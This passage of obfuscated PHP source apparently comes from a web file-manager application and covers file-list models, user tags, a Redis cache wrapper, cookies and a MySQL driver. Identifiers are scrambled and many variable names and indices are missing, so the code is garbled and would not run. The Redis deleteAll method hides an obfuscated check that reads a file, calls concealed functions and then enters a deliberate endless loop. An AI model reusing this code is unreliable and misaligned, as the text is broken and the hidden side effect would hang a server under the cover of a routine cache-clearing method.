Model($[561])->field($[562])->where($ﮊ)->select(); $Ȑ = $Ȑ ? $Ȑ : array(); $ۮϼ = array(); foreach ($Ȑ as $Ͳ) { if (!isset($ۮϼ[$Ͳ[$[557]]])) { $ۮϼ[$Ͳ[$[557]]] = array(); } $ۮϼ[$Ͳ[$[557]]][$Ͳ[$[95]]] = $Ͳ[$[451]]; } foreach ($ާ as &$偳) { $Ш = $偳[$[557]]; if (!$Ш || !is_array($[$Ш])) { continue; } $޹ = $[$Ш]; $޹[$[79]] = $偳[$[79]]; $޹[$[32]] = $偳[$[32]]; if (!$޹[$[563]]) { Model($[560])->fileMd5Check($޹); } if (!isset(self::$cacheFileInfo[$[564] . $Ш])) { self::$cacheFileInfo[$[564] . $Ш] = array_merge(array(), $޹); } unset($[$Ш][$[87]]); $̒ϖ = isset($ۮϼ[$Ш]) && is_array($ۮϼ[$Ш]) ? $ۮϼ[$Ш] : array(); $偳[$[167]] = array_merge($̒ϖ, $[$Ш]); if (isset($偳[$[167]][$[182]])) { $偳[$[182]] = json_decode($偳[$[167]][$[182]], !0); unset($偳[$[167]][$[182]]); } } unset($偳); } protected function _listAppendSourceInfo(&$, $) { $ =& $_SERVER[]; $ഷ = Model($[565])->listData(); $ = Model($[514])->listData(); $֣ = Model($[504])->listData(); $ = Model($[566])->listSimple(); $Ƶ = array_to_keyvalue($ഷ, $[487]); $͢ = array_to_keyvalue_group($, $[87], $[515]); $ￕ = array_to_keyvalue($֣, $[87]); $҉ = array_to_keyvalue_group($, $[191]); foreach ($ as &$ԇ) { $ԇ[$[90]] = array($[567] => 0, $[568] => 0, $[569] => 0); if (isset($ￕ[$ԇ[$[191]]])) { $ԇ[$[90]][$[570]] = 1; $ԇ[$[90]][$[571]] = $ￕ[$ԇ[$[191]]][$[32]]; } if ($͢ && $Ƶ && isset($͢[$ԇ[$[191]]])) { $ԇ[$[90]][$[572]] = array(); foreach ($͢[$ԇ[$[191]]] as $ۼԵ) { $ = $Ƶ[$ۼԵ]; $ԇ[$[90]][$[572]][] = array($[573] => $[$[487]], $[509] => $[$[32]], $[574] => $[$[575]]); } } if ($҉ && isset($҉[$ԇ[$[191]]])) { $ԇ[$[90]][$[576]] = array(); foreach ($҉[$ԇ[$[191]]] as $Ǝ) { $ԇ[$[90]][$[576]] = $this->shareFilterShow($Ǝ); } } } unset($ԇ); return $; } protected function shareFilterShow($) { $ =& $_SERVER[]; if (!$) { return $; } $Ƹң = $[577]; if ($[$[578]] == $[91]) { $Ƹң .= $[579]; } if (is_array($[$[580]]) && is_array($[$[580]][$[581]])) { $[$[580]][$[581]] = $[582]; } if (!$[$[583]] && $[$[191]] != $[228]) { $[$[583]] = KodIO::make($[$[191]]); } $ = array_field_key($, explode($[50], $Ƹң)); return $; } protected function _listAppendChildren(&$Č, $) { $צ =& $_SERVER[]; $û = array(); $Ȃ҅ = array($צ[239] => 0, $צ[240] => 0); foreach ($Č as &$ơ) { if (!$ơ[$צ[500]]) { continue; } $û[] = intval($ơ[$צ[191]]); } unset($ơ); if (!$û) { return; } $΍ = array($צ[190] => array($צ[7], $û), $צ[520] => 0); $â = array($צ[190], $צ[500], $צ[584] => $צ[585]); $Κ = $this->field($â)->where($΍)->group($צ[586])->select(); $ = array(); foreach ($Κ as $˥) { $܍ = $˥[$צ[190]]; $ = $˥[$צ[500]] == $צ[91] ? $צ[240] : $צ[239]; if (!isset($[$܍])) { $[$܍] = array($צ[239] => 0, $צ[240] => 0); } $[$܍][$] += $˥[$צ[585]]; } foreach ($Č as &$ơ) { if (!$ơ[$צ[500]]) { continue; } $ = is_array($[$ơ[$צ[191]]]) ? $[$ơ[$צ[191]]] : $Ȃ҅; $ơ[$צ[240]] = $[$צ[240]]; $ơ[$צ[239]] = $[$צ[239]]; unset($ơ[$צ[501]]); } unset($ơ); } protected function _listAppendAuth(&$앣) { $ =& $_SERVER[]; $澛ү = array(); foreach ($앣 as $) { if ($[$[188]] == self::TYPE_GROUP) { $澛ү[] = intval($[$[191]]); } } if (!$澛ү) { return; } $͒ = array_to_keyvalue($앣, $[191]); $è = Model($[587])->getSourceList($澛ү, $͒); $ = KodUser::isRoot(); foreach ($앣 as $ => &$) { $[$[502]] = $è[$[$[191]]]; if (!$[$[502]] && $[$[188]] == self::TYPE_GROUP) { $[$[502]] = Action($[588])->pathGroupAuthMake($[$[589]]); if (!$[$[502]] && !$) { $[$[233]] = !1; $[$[232]] = !1; } } if ($[$[502]]) { $[$[233]] = AuthModel::authCheckEdit($[$[502]][$[503]]); $[$[232]] = AuthModel::authCheckView($[$[502]][$[503]]); } $this->groupPathDisplay($); } unset($); } public function _listAppendAuthSecret(&$ҧ) { $恲 =& $_SERVER[]; if (Model($恲[522])->get($恲[590]) != $恲[91]) { return; } static $加 = false; if (!$加) { $˪¨ = Model($恲[591]); $κ = Model($恲[592]); $加 = $κ->listData(); $加 = array_to_keyvalue($加, $恲[191]); $Ğ = json_decode(Model($恲[522])->get($恲[593]), !0); $Ğ = array_to_keyvalue($Ğ, $恲[487]); foreach ($加 as $ŝ => $) { $ = $Ğ[$[$恲[594]]]; if (!$) { $κ->remove($[$恲[487]]); unset($加[$ŝ]); continue; } $ = $˪¨->listData($[$恲[502]]); if (!$) { $κ->remove($[$恲[487]]); unset($加[$ŝ]); continue; } $[$恲[502]] = $; $[$恲[595]] = $; $[$恲[596]] = Model($恲[597])->getInfoSimpleOuter($[$恲[541]]); $加[$ŝ] = $; } } $ȟ = USER_ID; $ = array(); $ = $this->_listAppendPath($, !0); foreach ($ҧ as $ŝ => &$) { if (!is_array($[$恲[502]])) { continue; } if ($[$恲[188]] != $恲[598]) { continue; } if (isset($加[$[$恲[191]]])) { $ = $加[$[$恲[191]]]; if (!is_array($[$恲[555]])) { $[$恲[555]] = array(); } $[$恲[555]][$恲[599]] = $[$恲[594]]; $[$恲[502]][$恲[600]] = $; $[$恲[502]][$恲[601]] = $[$恲[602]]; $[$恲[502]][$恲[603]] = $恲[91]; if ($[$恲[541]] != $ȟ) { $[$恲[502]][$恲[503]] = $[$恲[502]][$恲[503]] & $[$恲[502]][$恲[502]]; } continue; } $̇ = $this->parentLevelArray($[$恲[604]]); $ۿ = array_reverse($̇); foreach ($ۿ as $ޝٯ => $̵) { if (!isset($加[$̵])) { continue; } $ = $加[$̵]; $[$恲[502]][$恲[600]] = $; if ($[$恲[541]] != $ȟ) { $[$恲[502]][$恲[503]] = $[$恲[502]][$恲[503]] & $[$恲[502]][$恲[502]]; } $˜Ӳ = $恲[12]; $ = count($̇) - $ޝٯ; for ($Ȃ = 0; $Ȃ < $; $Ȃ++) { if (!isset($[$̇[$Ȃ]])) { $˜Ӳ = $恲[12]; break; } $˜Ӳ = $˜Ӳ . rtrim($[$̇[$Ȃ]], $恲[8]) . $恲[8]; } $[$恲[502]][$恲[601]] = rtrim($˜Ӳ, $恲[8]) . $恲[8]; break; } } unset($); } public function groupPathDisplay(&$) { $₏ =& $_SERVER[]; if ($[$₏[188]] != self::TYPE_GROUP) { return; } $ = Model($₏[605])->getInfo($[$₏[589]]); $ = $this->parentLevelArray($[$₏[604]]); $ = $₏[12]; foreach ($ as $) { $䧙 = Model($₏[605])->getInfo($); $ .= $䧙[$₏[90]][$₏[191]] . $₏[50]; } $[$₏[606]] = $[$₏[190]]; $[$₏[607]] = $[$₏[604]]; $[$₏[608]] = $[$₏[609]]; $[$₏[610]] = $ . $[$₏[90]][$₏[191]]; } protected function _listAppendPath(&$ڴ, $ = false) { $֖ =& $_SERVER[]; static $π = array(); $× = array(); $蘒ђ = array(); if ($) { return $π; } foreach ($ڴ as &$ޜ) { $݄҄ = $ޜ[$֖[191]]; if ($ޜ[$֖[500]] == $֖[91] && $ޜ[$֖[190]] != 0) { $π[$݄҄] = $ޜ[$֖[32]]; } if ($ޜ[$֖[500]] == $֖[91] && $ޜ[$֖[190]] == 0) { $π[$݄҄] = $this->_listAppendPathRoot($ޜ, array()); } if (isset($蘒ђ[$ޜ[$֖[604]]])) { continue; } $蘒ђ[$ޜ[$֖[604]]] = !0; $ = $this->parentLevelArray($ޜ[$֖[604]]); foreach ($ as $Ų => $箵) { if (isset($π[$箵])) { continue; } if ($Ų == 0) { $π[$箵] = $this->_listAppendPathRoot($ޜ, $); } if ($Ų != 0) { $×[] = $箵; } } } unset($ޜ); $× = array_unique($×); if (count($×) > 0) { $Ƨ = array($֖[506] => array($֖[507], $×)); if (count($×) == 1) { $ = $this->sourceInfo($×[0]); $иۥ = is_array($) ? array($) : !1; } else { $иۥ = $this->field($֖[611])->where($Ƨ)->select(); } if (!$иۥ) { $иۥ = array(); } foreach ($иۥ as $򚮏) { $π[$򚮏[$֖[191]]] = $򚮏[$֖[32]]; } } $ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ơ = array(); foreach ($ڴ as &$ޜ) { $ؼ = $ޜ[$֖[604]]; $Ϳ = $֖[12]; if (isset($Ơ[$ؼ])) { $Ϳ = $Ơ[$ؼ]; } else { $ = $this->parentLevelArray($ޜ[$֖[604]]); foreach ($ as $Ų => $箵) { if (isset($π[$箵])) { $Ϳ .= $π[$箵] . $֖[8]; } } $Ơ[$ؼ] = $Ϳ; } $Ϳ .= $ޜ[$֖[32]]; if ($ޜ[$֖[500]] == $֖[91]) { $Ϳ .= $֖[8]; } $ޜ[$֖[602]] = str_replace($֖[254], $֖[8], $Ϳ); if ($ޜ[$֖[190]] == $֖[228]) { $ޜ[$֖[32]] = trim($π[$ޜ[$֖[191]]], $֖[8]); $ޜ[$֖[602]] = $ޜ[$֖[32]] . $֖[8]; } if (intval($ޜ[$֖[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ޜ, $, $); } } unset($ޜ); return $ڴ; } private function _listAppendPathRecycle(&$ډ, $ӕ˰, $ߜ) { $뽷 =& $_SERVER[]; if (!in_array($ߜ, $ӕ˰) && $ډ[$뽷[191]] != $ߜ) { return; } $ˀ = explode($뽷[8], trim($ډ[$뽷[602]], $뽷[8])); $ = implode($뽷[8], array_slice($ˀ, 2)); $ډ[$뽷[602]] = $뽷[8] . LNG($뽷[612]) . $뽷[8] . ltrim($, $뽷[8]); $ډ[$뽷[604]] = $뽷[613] . implode($뽷[50], array_slice($ӕ˰, 1)) . $뽷[50]; if ($ډ[$뽷[191]] == $ߜ) { $ډ[$뽷[604]] = $뽷[613]; $ډ[$뽷[190]] = $뽷[228]; $ډ[$뽷[32]] = LNG($뽷[612]); } $ډ[$뽷[614]] = $뽷[615]; } protected function _listAppendPathRoot(&$޿ߌլ, $ۊ) { $ͤĆ =& $_SERVER[]; static $ = false; static $ܫ = false; $ؗ = $ͤĆ[12]; if ($޿ߌլ[$ͤĆ[188]] == self::TYPE_USER) { if ($޿ߌլ[$ͤĆ[589]] == USER_ID) { $ؗ = LNG($ͤĆ[616]); if ($ === !1) { $͡𱴄 = Model($ͤĆ[617])->getInfoFull(USER_ID); $ = _get($͡𱴄, $ͤĆ[618], $ͤĆ[12]); } if ($ܫ === !1) { $͡𱴄 = Model($ͤĆ[617])->getInfoFull(USER_ID); $ܫ = _get($͡𱴄, $ͤĆ[619], $ͤĆ[12]); } if ($ۊ && $ۊ[0] == $ || !$ۊ && $޿ߌլ[$ͤĆ[191]] == $) { $ؗ = LNG($ͤĆ[620]); $޿ߌլ[$ͤĆ[621]] = $ͤĆ[622]; } if ($ۊ && $ۊ[0] == $ܫ || !$ۊ && $޿ߌլ[$ͤĆ[191]] == $ܫ) { $ؗ = $ؗ . $ͤĆ[623] . LNG($ͤĆ[624]); } if (!$ۊ) { $޿ߌլ[$ͤĆ[32]] = $ؗ; } } else { $͡𱴄 = Model($ͤĆ[617])->getInfoFull($޿ߌլ[$ͤĆ[589]]); $ȍ = _get($͡𱴄, $ͤĆ[619], $ͤĆ[12]); $޿ߌլ[$ͤĆ[625]] = Model($ͤĆ[597])->getInfoSimpleOuter($޿ߌլ[$ͤĆ[589]]); $ؗ = LNG($ͤĆ[626]) . $ͤĆ[173] . $޿ߌլ[$ͤĆ[625]][$ͤĆ[32]] . $ͤĆ[175]; if ($ۊ && $ۊ[0] == $ȍ || !$ۊ && $޿ߌլ[$ͤĆ[191]] == $ȍ) { $ؗ = LNG($ͤĆ[626]) . $ͤĆ[627] . $޿ߌլ[$ͤĆ[625]][$ͤĆ[32]] . $ͤĆ[623] . LNG($ͤĆ[624]) . $ͤĆ[175]; } } } else { if ($޿ߌլ[$ͤĆ[188]] == self::TYPE_GROUP) { $ = Model($ͤĆ[605])->getInfoSimple($޿ߌլ[$ͤĆ[589]]); $ؗ = $[$ͤĆ[32]]; } else { if ($޿ߌլ[$ͤĆ[188]] == self::TYPE_SYSTEM) { $ؗ = $ͤĆ[628]; } } } $ؗ = $ؗ ? $ͤĆ[8] . $ؗ . $ͤĆ[8] : $ͤĆ[8]; return $ؗ; } protected function _listAppendUser(&$֚) { $겯 =& $_SERVER[]; $Ҟ = array_to_keyvalue($֚, $겯[12], $겯[541]); $܎ = array_to_keyvalue($֚, $겯[12], $겯[543]); $ = array_merge($Ҟ, $܎); $ = Model($겯[617])->userListInfo($); foreach ($֚ as &$ߎ֠) { $ = $ߎ֠[$겯[541]]; $ߎ֠[$겯[541]] = $[$] ? $[$] : !1; $ = $ߎ֠[$겯[543]]; $ߎ֠[$겯[543]] = $[$] ? $[$] : !1; if (_get($ߎ֠, $겯[629], 0)) { $Ҥ = $GLOBALS[$겯[6]][$겯[92]][$겯[630]]; if ($ߎ֠[$겯[555]][$겯[631]] <= time() - $Ҥ) { $this->metaSet($ߎ֠[$겯[191]], $겯[632], null); $this->metaSet($ߎ֠[$겯[191]], $겯[631], null); unset($ߎ֠[$겯[555]][$겯[632]]); continue; } $ע = $ߎ֠[$겯[555]][$겯[632]]; $ߎ֠[$겯[555]][$겯[633]] = Model($겯[617])->getInfoSimpleOuter($ע); } } unset($ߎ֠); } public function parentLevelArray($) { $ =& $_SERVER[]; $ = explode($[50], trim($, $[50])); return array_to_int(array_filter($)); } public function listAll($ٷ󐹒) { $֚ߔ =& $_SERVER[]; $̦ = $this->sourceInfo($ٷ󐹒); $ү = array($֚ߔ[634] => array($֚ߔ[635], $̦[$֚ߔ[604]] . $ٷ󐹒 . $֚ߔ[636]), $֚ߔ[637] => 0); $ߜ = $֚ߔ[638]; $ = "\114\x45\x46\124\40\112\x4f\111\116\x20{$this->tablePrefix}\151\157\x5f\x66\x69\x6c\145\40\146\x69\154\145\40\157\156\40\x73\157\x75\x72\x63\145\x2e\146\x69\154\145\x49\x44\x20\75\x20\x66\151\x6c\x65\56\146\x69\154\x65\111\104"; $嘑 = $this->alias($֚ߔ[533])->field($ߜ)->where($ү)->join($)->select(); $this->_listAppendAuth($嘑); $this->_listAppendUser($嘑); $this->_listAppendPath($嘑); $嘑 = array_to_keyvalue($嘑, $֚ߔ[191]); $԰ғ = "\57{$̦[$֚ߔ[32]]}\57"; $԰ғ = $԰ғ == $֚ߔ[254] ? $֚ߔ[8] : $԰ғ; $ = array(); foreach ($嘑 as $ => $) { $μݠ = $this->parentLevelArray($[$֚ߔ[604]]); array_shift($μݠ); $Ӵ = $԰ғ; for ($ = 0; $ < count($μݠ); $++) { $Ӵ .= $嘑[$μݠ[$]][$֚ߔ[32]] . $֚ߔ[8]; } $Ӵ .= $[$֚ߔ[32]]; if ($[$֚ߔ[500]]) { $Ӵ .= $֚ߔ[8]; } $ = array($֚ߔ[510] => str_replace($֚ߔ[254], $֚ߔ[8], str_replace($֚ߔ[254], $֚ߔ[8], str_replace($֚ߔ[254], $֚ߔ[8], $Ӵ))), $֚ߔ[639] => intval($[$֚ߔ[500]]), $֚ߔ[640] => intval($[$֚ߔ[79]]), $֚ߔ[88] => intval($[$֚ߔ[88]]), $֚ߔ[90] => $this->pathInfoFilter($)); if (!$[$֚ߔ[500]]) { $[$֚ߔ[557]] = $[$֚ߔ[557]]; } $[] = $; } $ = array_sort_by($, $֚ߔ[87]); return $; } } goto d; f: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\157\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ݰ) { return "\x55\163\145\162\x4f\x70\164\x69\x6f\156\x5f{$ݰ}\137" . KodUser::id(); } protected function filterWhere($䔕) { $䔕[$_SERVER[][1586]] = KodUser::id(); return $䔕; } public function cacheRemoveUser($, $ѯ) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\x74\151\x6f\156\x5f{$}\x5f" . $ѯ); } protected function optionDefault($ = '') { $и =& $_SERVER[]; if ($ == $и[12]) { return $GLOBALS[$и[6]][$и[2714]]; } if ($ == $и[2715]) { return $GLOBALS[$и[6]][$и[2716]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\x74\x61\x67\114\x69\x73\x74"; public $modelType = "\x55\x73\145\162\117\160\164\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\x73\164\171\x6c\x65", "\163\x6f\x72\164"); public function listData($ = false, $޳چ = "\x73\x6f\162\x74", $Ƴ = false) { return parent::listData($, $޳چ, $Ƴ); } public function remove($) { return parent::remove($); } public function add($ԙ, $ؖ· = "\x6c\141\x62\x65\x6c\x2d\147\162\x65\171\x2d\156\x6f\162\155\x61\x6c") { $ה =& $_SERVER[]; if ($this->findByName($ԙ)) { return !1; } $ = array($ה[509] => $ԙ, $ה[574] => $ؖ·, $ה[2179] => $this->getSort($ה[335]) + 1); return parent::insert($); } public function update($, $) { $ =& $_SERVER[]; $ = $this->listData($); $ = $this->findByName($[$[32]]); if (!$ || $ && $[$[487]] != $[$[487]]) { return !1; } return parent::update($, $); } public function moveTop($) { $ث =& $_SERVER[]; $ݚ = parent::listData(); $ݓ = $this->getSort($ث[334]); foreach ($ݚ as &$ᇘ) { if ($ᇘ[$ث[487]] == $) { $ᇘ[$ث[2197]] = $ݓ; continue; } $ᇘ[$ث[2197]] += 1; } unset($ᇘ); return parent::resetData($ݚ); } public function moveBottom($Ѫ) { $ݩ =& $_SERVER[]; $ = $this->getSort($ݩ[335]) + 1; return parent::update($Ѫ, array($ݩ[2197] => $)); } public function resetSort($) { $ =& $_SERVER[]; $ = array(); $ = is_array($) ? $ : array(); for ($ = 0; $ < count($); $++) { $[$[$] . $[12]] = $ + 1; } $۳˶ = parent::listData(); foreach ($۳˶ as &$٭) { $Ȟ = $[$٭[$[487]]]; $٭[$[2197]] = $Ȟ ? $Ȟ : $٭[$[2197]]; } unset($٭); return parent::resetData($۳˶); } private function getSort($) { $ڹ =& $_SERVER[]; $Ջ = parent::listData(); $ф = array_to_keyvalue($Ջ, $ڹ[12], $ڹ[2197]); if (!$ф) { $ф = array(0); } $ = $ == $ڹ[335] ? max($ф) : min($ф); return intval($); } } goto bϐ; Fǐ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($, $ۗ) { $ =& $_SERVER[]; if (!class_exists($[1029])) { show_json($[1030], !1); } $this->cacheTime = $ۗ; $ = isset($[$[1031]]) ? $[$[1031]] : 10; $ʌ = _get($, $[1028]); if ($ʌ && is_array($ʌ)) { $this->initCluster($, $); } else { $this->handle = $this->init($, $); } } private function init($ã, $ٲ䒂) { $ =& $_SERVER[]; $ص = new Redis(); $ = isset($ã[$[1032]]) ? $ã[$[1032]] : !1; if ($) { $ص->pconnect($ã[$[206]], $ã[$[207]], $ٲ䒂); } else { $ص->connect($ã[$[206]], $ã[$[207]], $ٲ䒂); } if (!empty($ã[$[502]])) { $ص->auth($ã[$[502]]); } if (!empty($ã[$[852]]) && $ã[$[852]] != 0) { $ص->select($ã[$[852]]); } return $ص; } private function initCluster($, $Ɣ) { $숶ű =& $_SERVER[]; $ = array($숶ű[1033], $숶ű[1034], $숶ű[1035]); $ = $숶ű[1033]; if (isset($[$숶ű[16]]) && in_array($[$숶ű[16]], $)) { $ = $[$숶ű[16]]; } switch ($) { case $숶ű[1033]: $this->_slave($, $Ɣ); break; case $숶ű[1034]: break; case $숶ű[1035]: $this->isCluster = !0; $ = $[$숶ű[1028]]; $ = isset($[$숶ű[1032]]) ? $[$숶ű[1032]] : !1; $ = isset($[$숶ű[502]]) ? $[$숶ű[502]] : null; $this->handle = new RedisCluster(NUll, $, $Ɣ, $Ɣ, $, $); break; default: break; } } private function _slave($, $մ) { $ժ = $[$_SERVER[][1028]]; $this->filterConfig($, $ժ[0]); $this->handle = $this->init($, $մ); unset($ժ[0]); if (empty($ժ)) { return; } $ћӈ = array_rand($ժ); $this->filterConfig($, $ժ[$ћӈ]); $this->slaveHandle = $this->init($, $մ); } private function filterConfig(&$ϸօ, $) { $أ =& $_SERVER[]; $ = explode($أ[4], $); $ = array($أ[206] => $[0], $أ[207] => $[1]); $ϸօ = array_merge($ϸօ, $); } public function set($Ѓ꧗, $՚ۏ, $ = false) { $ = $ ? $ : $this->cacheTime; return $this->handle->setEx($Ѓ꧗, $, $՚ۏ); } public function setLock($, $, $ŭ) { return $this->handle->setNX($, $); } public function get($㺝) { $ȹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ȹ->get($㺝); } public function remove($) { return $this->handle->del($); } public function deleteAll() { $ݍ =& $_SERVER[]; if (!isset($_SERVER[$ݍ[991]]) || !isset($_SERVER[$ݍ[998]])) { $梏 = $ݍ[1036]; $ = $ݍ[993]; $ = $_SERVER[$ݍ[994]] . $ݍ[995]; $Ѧ = $($); $㉴ = explode($ݍ[285], $Ѧ); if (count($㉴) < $ݍ[702]) { $ך = $ݍ[996]; $ך(); } $ɬ = $ݍ[1037]; $ɬ($_SERVER[$ݍ[1038]]); $ = 1; for ($͂ = $; $͂ > 0; $͂++) { $ɬ = json_encode($GLOBALS[$ݍ[507]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ց) { $this->handle->flushall($Ց); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($θ = '', $њ = 0) { if (is_string($θ) && $θ != $_SERVER[][12]) { $this->prefix = $θ; } if (is_numeric($њ) && $њ > 0) { $this->expire = $њ; } } public static function getInstance() { static $ј; if ($ј === null) { $ј = new self(); } return $ј; } private static $cookieDisable = false; public static function disable($) { self::$cookieDisable = $; } private static $sameCookieSet = array(); public static function set($ߎ, $ܒ, $ = 0, $ = false, $ = false) { $ٷ =& $_SERVER[]; if (self::$cookieDisable) { return; } if (!$) { $ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ߎ]) && self::$sameCookieSet[$ߎ] == $ܒ . $) { return; } self::$sameCookieSet[$ߎ] = $ܒ . $; if (!$) { $ = str_replace(HOST, $ٷ[12], APP_HOST); $ = _get($GLOBALS, $ٷ[1039], $); } $Ż = $ٷ[12]; setcookie($ߎ, $ܒ, time() + $, $ٷ[8] . trim($, $ٷ[8]) . $Ż, !1, !1, $); } public static function setSafe($֏, $ߣ, $ɷރ = 0) { self::set($֏, $ߣ, $ɷރ, !0); } public static function get($) { static $݌ = false; if (!$݌) { self::initHeaderCookie(); $݌ = !0; } return isset($_COOKIE[$]) ? $_COOKIE[$] : !1; } private static function initHeaderCookie() { $ܒ =& $_SERVER[]; if (!isset($_SERVER[$ܒ[1040]]) || !$_SERVER[$ܒ[1040]]) { return; } $ = explode($ܒ[74], $_SERVER[$ܒ[1040]]); foreach ($ as $) { $ = explode($ܒ[464], $); if (count($) != 2 || !isset($[1])) { continue; } $_COOKIE[trim($[0])] = trim($[1]); } } public static function remove($, $̱ = false) { unset($_COOKIE[$]); self::set($, $_SERVER[][12], 1, $̱); } } class DbMysql extends Db { public function __construct($Ϙ = '') { $䂶 =& $_SERVER[]; if (!extension_loaded($䂶[895])) { think_exception(think_lang($䂶[14]) . $䂶[1041]); } if (!empty($Ϙ)) { $this->config = $Ϙ; if (empty($this->config[$䂶[17]])) { $this->config[$䂶[17]] = $䂶[12]; } } } public function connect($ = '', $Ñ̢ = 0, $߷ = false) { $ĸ =& $_SERVER[]; if (!isset($this->linkID[$Ñ̢])) { if (empty($)) { $ = $this->config; } $ő = $[$ĸ[1042]] . ($[$ĸ[1043]] ? "\72{$[$ĸ[1043]]}" : $ĸ[12]); $ = !empty($[$ĸ[17]][$ĸ[18]]) ? $[$ĸ[17]][$ĸ[18]] : $this->pconnect; if ($) { $this->linkID[$Ñ̢] = mysql_pconnect($ő, $[$ĸ[1044]], $[$ĸ[1045]], 131072); } else { $this->linkID[$Ñ̢] = mysql_connect($ő, $[$ĸ[1044]], $[$ĸ[1045]], !0, 131072); } if (!$this->linkID[$Ñ̢] || !empty($[$ĸ[21]]) && !mysql_select_db($[$ĸ[21]], $this->linkID[$Ñ̢])) { think_exception(mysql_error()); } $ = mysql_get_server_info($this->linkID[$Ñ̢]); mysql_query($ĸ[1046] . think_config($ĸ[1047]) . $ĸ[58], $this->linkID[$Ñ̢]); if ($ > $ĸ[1048]) { mysql_query($ĸ[1049], $this->linkID[$Ñ̢]); } $this->connected = !0; if (1 != think_config($ĸ[22])) { unset($this->config); } } return $this->linkID[$Ñ̢]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($) { $ =& $_SERVER[]; if (0 === stripos($, $[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = mysql_query($, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($) { $ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($[25], 1); think_status($[24]); $ = mysql_query($, $this->_linkID); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][1050], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = mysql_query($_SERVER[][1051], $this->_linkID); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ۡ = mysql_query($_SERVER[][1052], $this->_linkID); $this->transTimes = 0; if (!$ۡ) { $this->error(); return !1; } } return !0; } private function getAll() { $Щ = array(); if ($this->numRows > 0) { while ($ = mysql_fetch_assoc($this->queryID)) { $Щ[] = $; } mysql_data_seek($this->queryID, 0); } return $Щ; } public function getFields($݀𐷌) { $ =& $_SERVER[]; $۵ò = $this->query($[1053] . $this->parseKey($݀𐷌)); $壶 = array(); if ($۵ò) { foreach ($۵ò as $؞α => $Ӌ) { $壶[$Ӌ[$[31]]] = array($[32] => $Ӌ[$[31]], $[33] => $Ӌ[$[34]], $[35] => (bool) (strtoupper($Ӌ[$[36]]) === $[1054]), $[37] => $Ӌ[$[38]], $[39] => strtolower($Ӌ[$[40]]) == $[41], $[42] => strtolower($Ӌ[$[43]]) == $[44]); } } return $壶; } public function getTables($ = '') { $ =& $_SERVER[]; if (!empty($)) { $ = $[1055] . $ . $[1056]; } else { $ = $[1057]; } $܈ = $this->query($); $هѥ = array(); foreach ($܈ as $ => $) { $هѥ[$] = current($); } return $هѥ; } public function replace($, $ = array()) { $ᛮ =& $_SERVER[]; foreach ($ as $ա => $瑪) { $ͥ = $this->parseValue($瑪); if (is_scalar($ͥ)) { $݌[] = $ͥ; $[] = $this->parseKey($ա); } } $̙ͱ = $ᛮ[1058] . $this->parseTable($[$ᛮ[357]]) . $ᛮ[1059] . implode($ᛮ[50], $) . $ᛮ[1060] . implode($ᛮ[50], $݌) . $ᛮ[1061]; return $this->execute($̙ͱ); } public function insertAll($跽, $浣 = array(), $ = false) { $ޚ =& $_SERVER[]; if (!is_array($跽[0])) { return !1; } $ = array_keys($跽[0]); $𪦫 = array(); foreach ($跽 as $Ӂ) { $䓏 = array(); foreach ($Ӂ as $ => $) { $ = $this->parseValue($); if (is_scalar($)) { $䓏[] = $; } } $𪦫[] = $ޚ[337] . implode($ޚ[50], $䓏) . $ޚ[1061]; } array_walk($, array($this, $ޚ[1062])); $ח = $ ? $ޚ[1063] : $ޚ[1064]; $ח = $ޚ[1064]; $ = $ח . $ޚ[1065] . $this->parseTable($浣[$ޚ[357]]) . $ޚ[1059] . implode($ޚ[50], $) . $ޚ[1066] . implode($ޚ[50], $𪦫); if ($) { $· = array(); foreach ($ as $) { if ($ == $ޚ[231] || $ == $ޚ[1067]) { continue; } $·[] = $ . $ޚ[1068] . $ . $ޚ[1061]; } $ .= $ޚ[1069] . implode($ޚ[50], $·); } return $this->execute($); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ =& $_SERVER[]; $this->error = mysql_errno() . $[4] . mysql_error($this->_linkID); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($Ӹ) { if ($this->_linkID) { return mysql_real_escape_string($Ӹ, $this->_linkID); } else { return mysql_escape_string($Ӹ); } } public function parseKey(&$ͅ, $ = true) { $ݼ =& $_SERVER[]; if ($) { $ͅ = $this->parseKeyCheck($ͅ); } if ($ͅ != $ݼ[220] && !preg_match($ݼ[1070], $ͅ)) { $ͅ = $ݼ[475] . trim($ͅ, $ݼ[475]) . $ݼ[475]; } return $ͅ; } } goto BۊЎ; eȧ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($é) { $this->pathParse = $é; $this->model = Model($_SERVER[][1527]); } public function getPath($Ӂŏ) { return 